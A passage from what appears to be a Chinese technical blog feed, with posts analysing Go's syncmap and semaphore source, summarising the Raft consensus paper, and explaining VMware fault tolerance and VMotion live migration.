<a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L124-L126" target="_blank" rel="noopener">忽略那些值为 nil 或 expunged 的 key</a>，营造出这个 key 不存在的假象。这在多数情况下不会有什么问题，但如果 key 是很占内存的类型，那这个删除也许并不符合应用的预期。</p><p>除了读写和删除外，syncmap 还支持 LoadOrStore、Range 等操作，原理和前面描述的差不多，其中 Range 操作除了提供遍历功能外，还能够 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L318-L323" target="_blank" rel="noopener">加速 dirty 到 readOnly.m 的升级</a>，即只要 readOnly.amended 为 true，也就是 dirty 中存在 readOnly 中不存在的 key 时，就会做 dirty 的升级操作，而不管 Map.miss 是否达到阈值。</p><p>总的来说，syncmap 还是适合多读少写的场景，进一步的，如果是更新原值的写操作也没什么，但如果存在大量的新增 key 的写操作，那 syncmap 的性能其实并不高，因为这些新的 key 都会被放在 dirty 中，而读写 dirty 是要加锁的。除此之外，频繁地增加新的 key 还可能引发多次 dirty 的升级，而每次升级后再增加新的 key 时，都会发生新 dirty 的初始化，这会产生 O(n) 的复杂度，在 k-v 数量很多的情况下会进一步影响应用的性能。</p><h1 id="semaphore"><a href="#semaphore" class="headerlink" title="semaphore"></a>semaphore</h1><blockquote><p>源码：<a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/semaphore/semaphore.go" target="_blank" rel="noopener">https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/semaphore/semaphore.go</a></p></blockquote><p>semaphore 这个工具我本人并没有使用过，但因为它也被包含在 sync 包中，所以就一起研究下。这个包的代码相较于前面几个而言比较简单，核心的结构体有如下两个：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Weighted provides a way to bound concurrent access to a resource.</span></span><br><span class="line"><span class="comment">// The callers can request access with a given weight.</span></span><br><span class="line"><span class="keyword">type</span> Weighted <span class="keyword">struct</span> &#123;</span><br><span class="line">size    <span class="keyword">int64</span></span><br><span class="line">cur     <span class="keyword">int64</span></span><br><span class="line">mu      sync.Mutex</span><br><span class="line">waiters list.List</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> waiter <span class="keyword">struct</span> &#123;</span><br><span class="line">n     <span class="keyword">int64</span></span><br><span class="line">ready <span class="keyword">chan</span>&lt;- <span class="keyword">struct</span>&#123;&#125; <span class="comment">// Closed when semaphore acquired.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中功能函数都是由 Weighted 这个结构来使用的，和前面的三个工具不同，尽管 Weighted 是可导出的，但功能上要求 Weighted.size 字段的值是大于零的，而 size 是不可导出的，所以使用者需要调用 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/semaphore/semaphore.go#L19-L24" target="_blank" rel="noopener">NewWeighted 方法</a> 来创建 Weighted 类型的变量。</p><p>从源码来看，semaphore 想要做的是通过 Weighted 声明可以使用的最大资源量，提供 Weighted.Acquire 方法来获取定量的资源，如果目前没有足够量的资源，那么当前的 goroutine 会以上文 waiter 结构的形式被添加到一个链表里，当有可用资源时，这个 goroutine 就会被唤醒；而之所以会有可用的资源，是因为有些 goroutine 释放了之前申请的资源，这是通过 Weighted.Release 方法来做的。除此之外，该包还提供了 Weighted.TryAcquire 用于无阻塞地申请资源，这个方法和 Weighted.Acquire 的区别在于，当没有足够量的资源时这个函数会立即返回 false 表示资源获取失败，而不是将当前 goroutine 加入到 waiters 链表中。</p><p>为了做到有资源时唤醒 goroutine，每个 waiter 结构都有一个名为 ready 的只写的 channel，我没有看出这里设置成只写是有什么意义，因为 <a href="https://github.com/golang/sync/blob/master/semaphore/semaphore.go#L55" target="_blank" rel="noopener">实际使用时</a> 用的还是一个双向的 channel，当 goroutine 获取不到所需的资源量时，会使用 select 来从这个 channel 中尝试读取数据，以此实现阻塞。而当某个 goroutine 调用 Weighted.Release 释放资源时，会调用 <a href="https://github.com/golang/sync/blob/master/semaphore/semaphore.go#L109-L136" target="_blank" rel="noopener">Weighted.notifyWaiters 方法</a>，按顺序遍历 waiters 链表中的各个 waiter，如果某个 waiter 所需的资源量已经可以获取到了，那么就调用 <code>close(waiter.ready)</code> ，这样对应的 goroutine 中的 select 就会结束，以此实现唤醒。</p><p>semaphore 的核心逻辑到此为止就结束了，但我们还能从中发掘一些其他的信息。首先是如果调用 Weighted.Acquire 时传递了一个比 Weighted.n（即资源的总量）还大的数字，那么 <a href="https://github.com/golang/sync/blob/master/semaphore/semaphore.go#L48-L53" target="_blank" rel="noopener">当前 goroutine 就会陷入阻塞</a>，直到 <code>&lt;-ctx.Done()</code> 返回。但这就对 ctx 有了要求，它不能是 <code>ctx.TODO()</code> 或 <code>ctx.Background()</code>，因为这两个 ctx 的 Done 方法会返回一个 nil，而尝试从一个为 nil 的 channel 中读取数据会导致当前 goroutine 永远陷入阻塞。</p><p>另一方面，Weighted.waiters 是一个链表，而 Weighted.notifyWaiters 方法在被调用时会按序遍历这个链表尝试唤醒，<a href="https://github.com/golang/sync/blob/master/semaphore/semaphore.go#L117-L130" target="_blank" rel="noopener">遇到第一个不能唤醒的 goroutine 时，这个函数就退出了</a>。这会导致什么问题呢？比如目前可用的资源量是 5，waiters 链表中各个 waiter 的 n 依次是 6, 1, 1, 1，实际上这个链表中的后三个 goroutine 都是可以被唤醒的，但因为第一个 goroutine 需要的资源量是 6，就导致后续的 goroutine 不会被扫描。关于这部分，注释中给出的解释是为了效率，因为 semaphore 中使用的链表操作的时间复杂度都是 O(1) 的，而如果使用小顶堆这类的结构，虽然可以尽可能唤醒那些被阻塞的 goroutine，但增删的时间复杂度是不及链表的。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 Raft 一致性算法</title>
      <link href="/2022/07/31/Raft/"/>
      <url>/2022/07/31/Raft/</url>
      
        <content type="html"><![CDATA[<blockquote><p>论文<a href="https://pdos.csail.mit.edu/6.824/papers/raft-extended.pdf" target="_blank" rel="noopener">下载</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2014年，一个名为 Raft 的算法被提出，这是一个以易于理解和方便实现为目的一致性算法。作者在同一年分别发表了名为 《In Search of an Understandable Consensus Algorithm》的论文，以及它的 Extended Version，较为详细地描述了 Raft。除此之外，作者的博士论文则以一个更详细的表述方式来描述了 Raft 的各个特性，所以 2014 年的版本被后人称为“ Raft 小论文”，本文就是小论文的阅读笔记与一些思考。</p><h1 id="Raft-要解决什么问题"><a href="#Raft-要解决什么问题" class="headerlink" title="Raft 要解决什么问题"></a>Raft 要解决什么问题</h1><p>在讨论 Raft 的特性前，我认为明确它要解决的问题是更重要的。首先，Raft 是一个一致性算法，这类算法服务于分布式场景，试图在集群中的成员间就某件事情达成一致。导致不一致的原因会有很多，较为常见的就是 CAP 中的 P，也就是网络分区。</p><p>举例来说，单 Leader 多 Follwer 的模式被很多分布式系统所采用，Follwer 多数负责分摊读取的流量，Leader 则负责写入。基于这个假设，底层存储的设计会变得简单，因为它只需要考虑来自一台机器的写流量即可。但是一旦 Leader 与 Follwer 之间出现网络分区，Follwer 们就会因为长时间收不到 Leader 的心跳而选出新的 Leader，此时整个系统就会出现两个 Leader，因为旧的 Leader 可能并没有意识到自己在其他机器看来是下线的状态，这被称为脑裂，是一种因为 Follower 和 Leader 间信息不一致而导致的现象。</p><p>所以，一致性算法的出现就是为了解决这类问题，即，在将网络分区或节点宕机等现象视为必然的条件下，保证节点间相互一致，对外继续提供稳定可靠的服务。而 Raft 就是这样的算法。</p><h1 id="Raft-概述"><a href="#Raft-概述" class="headerlink" title="Raft 概述"></a>Raft 概述</h1><p>Raft 是一个非常依赖 Leader 的算法（论文中称之为 Strong leader），所以它本身就是一个单 Leader 多 Follower 的系统，和一般系统所不同的是，为了保证一致性，它的读写都需要通过 Leader 来进行。这个算法服务于<strong>分布式状态机</strong>，Leader 以日志的方式向 Follower 发送状态的变化，并以“所有节点中的大多数所达成的一致”作为整个系统的一致。也就是说，如果整个系统中有 3 个节点，那么只要 2 个节点达成一致，就认为整个系统是一致的，与之类似的，如果整个系统中有 5 个节点，那么至少需要有 3 个节点达成一致。反过来讲，5 个节点的系统最大可以容忍 2 个节点失效。</p><p>通常而言，Raft 的节点数是奇数，多为 3 个或 5 个，因为 Raft 其实是一个节点间通讯非常频繁的系统，它需要保证整个集群中的任意两个节点都可以发起 RPC 通信，所以如果集群中节点数量很多，那么节点间的 Raft 通信本身就是网络的一个压力来源。正是由于节点的数量并不多，所以采用 Raft 的系统并不会直接作为用户使用的大流量一致性存储系统，而是作为一个协调系统，帮助其他系统简单而可靠地达成一致。</p><h1 id="节点状态与通信"><a href="#节点状态与通信" class="headerlink" title="节点状态与通信"></a>节点状态与通信</h1><p>在 Raft 中，时间被划分为一个个任期，每个任期通过一个递增的数字来标明。Raft 的节点被分为三种状态，分别是 Leader，Follower 和 Candidate，各自的说明如下：</p><ul><li>Leader：整个系统的老大，客户端的读写都通过它来进行，应用层的状态由它说了算</li><li>Candidate：有机会成为老大</li><li>Follower：老大的小跟班，有时会成为 Candidate</li></ul><p>三类节点的任意两两间都可以通过 RPC 进行交流。要想实现 Raft 的基本功能，只需要有两种 RPC，这两种 RPC 都会携带发送者认为的当前的任期号，仅当这个任期号大于等于接受者的任期号时，请求才被视为有效的。论文的 Figure2 中有两个 RPC 详细的参数说明，所以这里仅简单说明下对应的功能：</p><ul><li>AppendEntries：发送日志、说明已提交的日志位置、心跳检测，由 Leader 发起</li><li>RequestVote：发起投票，由 Candidate 发起</li></ul><p>当一个节点刚刚加入到 Raft 集群中时，它的状态是 Follower，这种状态的节点会维护一个计时器，在计时器到期之前它需要收到来自 Leader 的 AppendEntries，如果成功收到，那么它会重置计时器，等待下一个 AppendEntries 的到来，这个状态会一直重复下去。另一方面，如果计时器到期，那么节点就从 Follower 转换为 Candidate。这时它会给自己投一票，然后对其他节点发出 RequestVote。如果它能够收到集群中大多数节点的认可，那么它的状态就会变为 Leader。Leader 节点负责与客户端通信，并将状态的变化以日志的方式通过 AppendEntries 发送给其他节点。</p><p>上面描述的是一般情况下节点的状态变化，但是如前所述，其实任意状态的两个节点都可以进行 RPC 交流。比如 Leader 在发送 AppendEntries 时并不区分接受者的状态，所以 Candidate 也是可以收到 AppendEntries；与之类似的，Candidate 在发送 RequestVote 时也不区分接受者的状态，所以 Leader 也可以收到 RequestVote。作为一个接受者，不论它收到的是什么 RPC，也不论它当前是什么状态，如果 RPC 参数中的任期号大于它当前所记录的任期号，那么它就会变为 Follower，因为集群中的有效任期号以节点中最大的那个为准，所以小于这个任期号的节点都被视为过期。</p><p>另一方面，当多个节点同时变为 Candidate 并发起 RequestVote 时，就很有可能无法选出 Leader。比如 5 个节点中有 4 个都变为 Candidate，那么它们会分别给自己投一票，但是 Raft 规定，每个节点在同一个任期中只可以给一个节点投票，所以不论最后的那个节点把票投给谁，集群中都最多只能达成“两个节点投票给同一个节点”，而这并不符合“大多数”的 3 个节点。所以为了避免这种情况，Raft 规定 Follower 的计时器时长应该为一定范围内的随机值，并且当 Follower 收到 AppendEntries 并重置计时器时，也会重新计算一个新的随机值，从而通过这种随机性来打散节点变为 Candidate 的时机，以尽量避免前文所述的多个节点同时变为 Candidate 的情况。</p><p>此外，作为一个分布式系统，支持节点的数量变化也是一种刚需。Raft 的很多机制都离不开“大多数”，但节点的变化就可能导致出现多个“大多数”。举例来说，一个 3 节点的 Raft 集群被增加为 5 个节点，那么这个增加操作也需要得到大多数节点的同意。我们将节点从 1～5 编号，假设前 3 个是原有的节点，4、5 是新加入的节点。那么很可能 2、3 是同意增加节点的，它们会和 4、5 一样，认为此时 3 个节点的一致性才是集群的一致性。但 1 由于一些原因<strong>还没有同意</strong>增加节点，此时它还是认为集群中只有 3 个节点，所以只要有 2 个节点达成一致，那么整个集群就是一致的。</p><p>这会导致什么问题呢？如果 1 和 4 同时发起选举，1 很可能共得到 2 个投票，4 则会得到 3 个投票，由于实际集群中有 5 个节点，所以 4 会成为 Leader 是符合 Raft 对大多数的定义的；但由于 1 仍然认为集群中只有 3 个节点，所以它也会成为 Leader。同一个集群中出现了两个 Leader，也就是发生了脑裂，Raft 作为一个对 Leader 强依赖的算法，在这样的情况下就无法保证一致性了。</p><p>怎么解决这个问题呢？Raft 提供了两种思路，这里仅对易于工程实现的思路做解释。具体来说，Raft 规定不论是增加节点还是删除节点，每次都只能操作一个节点。这就可以保证即便集群中的节点对节点总数的判断不一致也不会出现脑裂的情况，因为整个集群中对于“大多数”的判断只会有两个答案，比如原来有 4 个节点，为了选出 Leader 就需要获得 3 个节点的投票，现在变成 3 个节点就需要获得 2 个节点的投票，而两类节点的“大多数”之和会大于原来集群中节点的数量，即 2 + 3 = 5 &gt; 4，所以一定会有一个节点同时属于两个“大多数”，这个节点就是非常关键的角色，它的投票会影响系统的最终结果。如前所述，节点数量的变化需要经过“大多数”节点的同意，所以这个关键的节点一定知道集群数量的变化，那么它一定会把票投给知道集群数量变化的那个 Candidate 来帮助它成为 Leader。</p><p>可以证明，对于新增节点的场景也是类似的，那个关键的节点会把票投给更新的 Candidate。怎么定义哪个 Candidate 更新呢，要用它所拥有的日志来判断。</p><h1 id="Raft-的日志"><a href="#Raft-的日志" class="headerlink" title="Raft 的日志"></a>Raft 的日志</h1><p>我们前面提到，Raft 算法是服务于分布式状态机的。那么对于状态机本身而言，就需要有一种机制可以同步状态的变化，通常而言就是日志。与客户端直接交互的节点会更新自己的日志，然后将新的日志同步给其他的 replica 们，这些 replica 接收到日志后在本地重放（replay），最终其内部的状态就会与其他节点达成一致。</p><p>发送日志的时机取决于系统本身的要求，我们曾讨论过同步发送和异步发送的利弊。对于 Raft 这样一个聚焦于一致性的算法，它选择在执行命令前先同步日志，也就是所谓的 WAL。但与其他系统不同的是，Raft 在日志同步上也仅需要达成大多数的一致，比如集群中有 5 个节点，那么它只需要成功同步给其中的 2 个节点，加上它自己本地的一份，整个集群中就有 3 个节点对日志达成一致，这在机制上就可以保证一致性了。通过这种方式，采用 Raft 的系统在同步日志的效率上不会受制于那些 struggler，也就是因为各种原因显著慢于其他节点的节点。</p><p>我们前面提到为了保证一致性，采用 Raft 的系统的读写都要通过 Leader 来完成。我们假设使用 Raft 的是一个分布式 kv 系统，那么它所支持的最基本的操作就是 get/set。当一个节点成为 Leader 后，它就会开始接收来自客户端的请求。收到请求后，Raft 模块会把这个命令以 Log Entry 的形式追加进自己的本地日志中，然后发送 AppendEntries 的 RPC 来将日志同步给其他节点，当收到大多数节点的同意后，Raft 模块会把相关状态同步给应用层，在这种情况下应用层就会将命令的效果应用在本地状态机中，然后把最终结果返回给客户端。</p><p>每个 Log Entry 会有它自己的下标、创建它时系统的任期号（是当时的 Leader 以为的任期号，<strong>实际可能不准确</strong>）以及包含的命令。通常情况下，Leader 和 Follower 的日志应该是一致的，但 Raft 把不一致视为必然现象，那么怎么定义不一致呢，大体有两类。首先第一种就是日志的长度不一致，比如前面提到的 struggler，这些节点通常只有 Leader 节点上前半部分的日志，后面的部分由于各种原因还没有被同步过来；另一种就是同一个下标对应的 Log Entry 不同，导致这一现象的原因有很多，比如 Leader 收到命令 <code>put x 1</code> 来将 x 写入 1，但它在将对应的 Log Entry 追加到本地后就发生了网络分区，在它离线期间其他节点中选出了新的 Leader，并收到了 <code>put x 2</code> 的命令并成功同步，此时旧的 Leader 在同样的位置上的 Log Entry 就与其他节点不一致。</p><p>Raft 怎么处理这种不一致呢？首先在前面我们提到，选举 Leader 时，节点在投票时要考虑两方面的因素，第一是目标 Candidate 的本地任期号是否大于自己，第二是目标 Candidate 是否有比自己<strong>更新的</strong>的日志。这里的更新有两个含义，如果 Log Entry 的任期号相同，那么具有更大下标的日志更新；如果日志的下标相同，那么具有更高任期号 Log Entry 更新。可以发现，这其实就是对齐了前面提到的两种不一致。因为只有具有更新的日志的节点才有机会成为 Leader，而客户端的读写又通过 Leader 进行，所以客户端还是可以读到更新的结果。另一方面，Leader 采用 AppendEntries 来做心跳检测，这个 RPC 本身就是用来同步日志的。通过这个机制，Leader 是可以发现 Follower 的日志与自己日志间的不一致的。在这种情况下，Leader 会对不一致的部分进行调整，少日志就加，错日志就覆写，最终 Follower 的日志状态就会和 Leader 达成一致。</p><p>和其他依赖日志的系统一样，随着系统的运行日志会变得越来越大，最终耗尽持久化设备的空间。Raft 对这种问题的解决方案是 snapshot，就是把当前已有的日志通过某种方式变成一个等价的、但是占用空间更少的表现形式，实现这种效果的方案有很多。比如对于一个使用 Raft 的分布式 kv 系统而言，就可以采用类似 Redis 的 AOF 重写的机制。具体而言，如果日志中的内容包含对同一个键的一系列操作，那么最终有效的其实只有最后一个操作，所以只需要在日志中保留这个值的最终状态即可。论文中把这个操作称为 Log Compaction，也就是日志的“压实”，我觉得这个词还是非常贴切的。</p><p>那么会不会出现经过 Log Compaction 后，日志占用的磁盘空间还是很大的情况呢？我觉得这种情况是很少的，因为如果距离上一次压实后（我们称它为 snapshot）并没有新的命令被执行，那么实际上内存中的状态和 snapshot 是一致的。对于一个使用 Raft 的分布式 kv 系统而言，snapshot 里记录的大概就是每个 key 对应的 value 是什么，这和内存中的信息是一样的，如果这些信息都可以被保存在内存中，那么保存在持久化设备上就不是什么大问题了。</p><h1 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h1><p>接下来讨论一些其他方面的问题。</p><p>首先，我们前面提到，为了保证一致性，采用 Raft 的系统的读写都需要在 Leader 上进行，但是读操作为什么需要呢？可以确定的是，从 Raft 系统中读出的内容一定是被“大多数”节点承认的内容，因为只有被多数节点承认，这个内容才会被应用到状态机中。但是尽管这个内容是被承认的，它也有可能是过期的，比如如果允许从 Follower 上读取内容，那么与客户端交互的有可能就是一个 struggler，也就是说它内部的日志是延后于其他节点的。那么此时客户端通过它来读取，就可能读到曾经的某个时刻有效、但是在当前实际已经被修改的值。而这其实就回到了主从复制系统的一个共有问题，也就是同步延迟带来的问题，一些业务场景是可以容忍这短暂的不一致的。因此，如果不要求读的强一致性，那么读操作也不是一定要发生在 Leader 上的。</p><p>那么，是不是只要从 Leader 上读取，就一定可以读到最新的内容了呢？原理上是这样的，但是问题在于 Leader 并不能很轻易地判断它自己是不是 Leader。比如说，曾是 Leader 的节点与其他节点间发生了网络分区，导致其他节点因为收不到它的心跳而开始选举新的 Leader，并在选举成功后写入了新的内容。那么对于那些还在与旧 Leader 交互的客户端而言，它们与旧 Leader 都没有意识到新 Leader 的产生，如果此时旧 Leader 直接从自己的状态机中取出对应的状态返回给客户端，那么这其实就和上面提到的直接从 Follower 上读取是一样的场景了。</p><p>所以为了保证一致性，读操作也要写入日志，并且通过 Raft 模块同步到其他节点上，只有得到多数节点的同意，Leader 才能确保它确实是 Leader，然后放心地将自己状态机中的状态返回给客户端。把读操作放进日志中可能看起来有些奇怪，但是本身日志的内容就不是既定的，比如 etcd 的 Raft 模块中甚至有 Dummy Log Entry，用来避免论文 Figure8 描述的现象，这里就先不展开了。</p><p>另一个问题是，当客户端发送了更新状态的命令给 Leader，那么 Leader 将其写入日志后会同步到其他节点，如果同步失败了会怎样？当有新的客户端发送其他更新状态的命令时，Leader 会用这个命令对应的日志将前面同步失败的日志覆盖掉吗？对于这个问题，论文的 Figure3 里明确说明了 Leader 是 Append-Only 的，也就是不会覆写自己日志中已有的内容（但是会覆写其他节点的，因为它是老大它说得算）。可是，这样一来不就有脏数据在日志中了吗，因为同步失败时 Leader 会返回客户端命令执行失败，但是经过几轮心跳检测的 AppendEntries，这个当时被认为失败的日志还是会被同步并应用到其他节点的状态机中，此时系统的状态就和客户端预期的不一致了。</p><p>我觉得这个问题还是应该看具体的场景，比如还是以分布式 kv 系统举例，那么客户端在收到命令执行失败的响应后可以直接发起重试，因为它的操作是幂等的，这次重试对应的日志会被放在失败的那条日志后面，并且被同步到其他节点上，这时的这个日志是被认为有效的，前面的那条被客户端认为失败的日志可以简单地理解为被后面的日志覆盖掉了，这其实也是 kv 系统的日志可以做 Log Compaction 的原因，因为对于同一个 key 而言，最后一次的操作才是其最终的状态。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
          <category> 论文 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析虚拟机容错与不停机迁移</title>
      <link href="/2022/07/12/vm-ft/"/>
      <url>/2022/07/12/vm-ft/</url>
      
        <content type="html"><![CDATA[<blockquote><p>VMware-FT 论文下载：<a href="http://nil.csail.mit.edu/6.824/2020/papers/vm-ft.pdf" target="_blank" rel="noopener">下载链接</a></p><p>VMware-VMotion 论文下载：<a href="https://www.usenix.org/legacy/publications/library/proceedings/usenix05/tech/general/full_papers/short_papers/nelson/nelson.pdf" target="_blank" rel="noopener">下载链接</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自 4.0 版本开始，VMware vSphere 平台提供虚拟机的容错（VMware vSphere Fault Tolerance）功能，该功能参考了复制状态机（RSM）模型，实现了两台<strong>单核</strong>虚拟机的状态同步。同步的结果是当作为 primary 的虚拟机宕机时，曾经的 backup 虚拟机可以快速接替它成为新的 primary，而这种切换对上层应用是透明的。对于后人来说，这是一个学习复制状态机模型的绝佳例子，本文将记录我在阅读相关论文时的一些思考与总结。</p><h1 id="复制状态机概述"><a href="#复制状态机概述" class="headerlink" title="复制状态机概述"></a>复制状态机概述</h1><p>在前面讨论 GFS 时我们提到，为了避免 Master 造成单点故障，GFS 以同步+异步的方式将 primary Master 的操作日志发送到其他服务器上，这些服务器通过回放（replay）接收到的操作日志，就可以达成和 primary 一致的状态。</p><p>这种通过<strong>传递操作</strong>在多个节点间达成一致的方式就被称为复制状态机，与之相对的还有一种同步方式叫做“状态复制”，这种方式通过<strong>传递状态</strong>来达成一致，在 GFS 的场景下 checkpoint 的传递就可以理解为是一种“状态复制”。所以相对而言，复制状态机每次传递的数据量是比较小的。</p><p>复制状态机的总体思路是这样的，如果两个状态机从同一个状态开始接收一系列相同的<strong>确定性输入</strong>，那么它们最终会达成相同的状态。什么叫做确定性输入呢，比如我们有函数 Now() 用于获取调用这个函数时系统的时间，那么“调用 Now()，并将它的返回值赋给 X”这个操作就不是确定性的，因为两个状态机可能会在不同的时间收到这个指令，而指令执行时间的不同会导致 Now 的返回值不同，进而导致 X 的值不一致。</p><p>所以利用复制状态机来做状态同步的系统需要特别处理那些不是确定性的输入，比如在 primary 上执行“调用 Now()，并将它的返回值赋给 X”这个指令，但是记录下 Now 的返回值，比如是 123456，然后在 backup 上则执行“将 123456 赋值给 X”的指令，从而达成两个状态机的同步。</p><h1 id="VM-FT-原理"><a href="#VM-FT-原理" class="headerlink" title="VM FT 原理"></a>VM FT 原理</h1><p>论文第 4 节给出了两种非默认的实现，为了方便，这里仅讨论 VM FT 的默认实现，也就是 <strong>Shared Disk</strong> 以及<strong>不在 backup 上执行实际的读盘操作</strong>。</p><p>首先要明确的是，VMware vSphere 是一个全虚拟化平台，这意味着虚拟机看到的 cpu、内存、外设等都是由 Hypervisor 模拟出来的，因此虚拟机的方方面面对 Hypervisor 而言都是可见且可控的。在这样的虚拟化方案下，如果将 VM FT 的功能实现在 Hypervisor 上，就可以达到“任何操作系统不经过任何改动就可以使用 VM FT 的功能”的效果。</p><p>总体而言，vSphere 会被部署在集群上，集群中的每个物理节点运行 Hypervisor，Hypervisor 上运行各个虚拟机。Hypervisor 本质上只是服务器上的进程，所以对于一个开启了 VM FT 的虚拟机而言，它的 primary 和 backup 不应该被运行在同一台物理机上，因为一旦这个物理机宕机，primary 和 backup 就同时失效了。</p><p>primary 虚拟机所在的 Hypervisor 会与 backup 所在的 Hypervisor 通信，这种通信是通过在 Logging Channel 上传输 Log Entry 来实现的。所有的外部输入都会被发送到 primary，而 primary 将输入封装成<strong>确定性的</strong> Log Entry 发送给 backup，所以 backup 的状态变化是由 primary 发来的 Log Entry 驱动的，它本身不直接接受外部输入。而对外的输出同样都由 primary 产生，backup 的输出会被 Hypervisor 直接屏蔽掉。</p><p>在默认实现上，集群中的物理节点使用 Shared Disk，这可能是 NFS 或 iSCSI 协议背后的存储集群。通过共享存储，primary 虚拟机不需要将磁盘变化同步给 backup，这一方面减少了状态同步的开销，一方面又可以为存储集群配置单独的容错策略，从而和应用解耦。</p><p>那么 backup 如何知道 primary 发生错误导致退出了呢？首先，primary 执行过程中遇到的中断也同样会被发送给 backup，而在所有的中断中，时钟中断是会定期发生的，所以如果 primary 能够正常执行，由于时钟中断的存在，backup 不会很长时间收不到 Log Entry。反过来说，如果 backup 很久（理论上指大于“两次时钟中断之间的间隔时间加网络传输时间”的时间，但论文中说通常设为几秒）没收到 Log Entry，那么就可以认为 primary 出了问题，此时 backup 会接替它成为 primary。除了这个机制，vSphere 还让 primary 和 backup 的 Hypervisor 保持心跳检测，以进一步检测 primary 的问题。</p><p>这一切都显得非常美好且合理，但是正如前文所述，除了让两个复制状态机保持接收相同的确定性输入外，它们还需要从一个<strong>相同的状态</strong>开始接收才可以保证它们进入到相同的新状态。但是当 primary 异常，backup 成为新的 primary 时，系统需要创建一个新的虚拟机并让它成为新的 backup。这个新的虚拟机要如何才能达成与当时的 primary 一致的状态呢？这就是 VM VMotion 的工作了。</p><h1 id="VMotion-原理"><a href="#VMotion-原理" class="headerlink" title="VMotion 原理"></a>VMotion 原理</h1><p>VM VMotion 需要做到的是将某个虚拟机从其所在的源物理机上迁移到另一台物理机上，在迁移过程中不需要完全停机，虚拟机的使用者也很难感知到这个迁移动作的发生。</p><p>那么迁移具体指什么呢？本质上讲，这个过程是在另一台物理机上启动一个新的虚拟机，但是这个虚拟机的 cpu、外设、网络、硬盘、内存状态都与源虚拟机完全一致。如果将源虚拟机删除，那么这被称为迁移，如果保留源虚拟机，那么这被称为克隆。VM FT 使用的是克隆，但是其原理和迁移几乎是一样的，所以后面的讨论中以迁移举例。</p><p>大体而言，VMotion 会经历如下步骤：</p><ol><li>选定需要被迁移的虚拟机以及目标物理机；</li><li>在保持虚拟机运行的状态下，预复制（Pre-copy）虚拟机的内存到目标物理机上；</li><li>暂停虚拟机的运行，然后复制除内存外的其他状态，这通常只需要很短的时间；</li><li>复制剩余的内存，然后在目标物理机上让虚拟机运行。</li></ol><p>可以发现在整个过程中，有两个阶段都是针对内存的复制。之所以会有这样的情况，是因为内存其实是最难被复制的状态，因为首先内存的容量通常都比较大，这使得先暂停虚拟机再复制内存的方式变得不可行，因为复制所需的时间会很长，导致虚拟机停机的时间也会很长，这对虚拟机中的应用而言是不可接受的。另一方面，内存又是一个会随着虚拟机的运行而不断变化的组件，所以虚拟机是一定要被暂停的，否则传输变化的速度很难超过产生变化的速度，这样永远都不能完成迁移。</p><p>那么为了尽可能减少对虚拟机内应用的影响，就需要让虚拟机暂停的时间尽可能少，如何做到这一点呢？答案是局部性原理。具体而言，操作系统把内存按页划分，在很短的时间中内存的变化会聚集在几个页面里。基于这个原理，我们就可以在不停机的状态下先将完整的内存空间复制到目标物理机上，由于完整的内存很大，这通常是一个比较耗时的操作。而每个页面在传输后一旦发生变化就会被记录下来，这对一个全虚拟化平台而言可以很容易地做到。在上面的第 3 步时，为了复制除内存外的其他状态（比如虚拟 cpu 中各个寄存器的值），就需要将虚拟机暂停，到此为止我们已经记录了一些变化过的页面，而由于虚拟机已经暂停，从此之后就不会再有变化的页面。此时系统就可以将这些变化的页面传输到目标物理机上，如前所述，由于局部性原理，这些页面的数量通常是比较少的，所以传输它们并不会花太多时间。</p><p>相较于内存，网络和存储就没有那么困难了。尤其是存储，因为我们使用 Shared Disk，所以只需要让被复制的虚拟机连接存储集群就可以了。而对于网络而言，由于虚拟机的网卡是被 Hypervisor 模拟出来的，多个虚拟网卡可能共享同一个物理网卡，所以不管迁不迁移，物理网卡都照常首发网络包，只是它到虚拟网卡的映射被 Hypervisor 修改，使得网络包被发送到了新的虚拟机上。</p><p>由于网络流量可以平滑地被迁移到另一台虚拟机上，而这台虚拟机又有着与源虚拟机完全相同的内存状态，这意味着它们打开的 TCP 连接等状态也是一致的，所以应用并不会因为迁移操作而受到什么影响。</p><p>所以总结来说，VMotion 可以创建一个与源虚拟机完全一致的复制虚拟机，这使得复制状态机“一致的初始状态”的条件就可以通过它来达成了。</p><h1 id="VM-FT-的一些细节"><a href="#VM-FT-的一些细节" class="headerlink" title="VM FT 的一些细节"></a>VM FT 的一些细节</h1><p>Hypervisor 为开启 VM FT 的虚拟机维护了一个 Buffer 用于发送和接收 Log Entries。Primary 将状态变化（具体内容见下文）封装成确定性的 Log Entry，然后写入到 Buffer，通常情况下它完成这个写入就可以继续执行。Buffer 有点类似于 TCP 的滑动窗口，里面的 Log Entry 会被异步发送到 backup 的 Buffer 中。每当 backup 处理一个 Log Entry，它就会返回一个 ACK 给 primary，论文中重点强调了这个 ACK 对 Output Rule（见下文）的作用，但我猜 primary 虚拟机的 Buffer 中 Log Entry 应该仅在收到 ACK 时才会被删除，从而留出空间放新的 Log Entry。因为 TCP 只能保证网络包被送达，但是不能保证里面的内容被放入 Hypervisor 为 backup 提供的 Buffer 中。</p><p>所以，由于发送速度和处理速度的不均等，primary 的 Buffer 可能会满，backup 的 Buffer 也可能会空。当 backup 的 Buffer 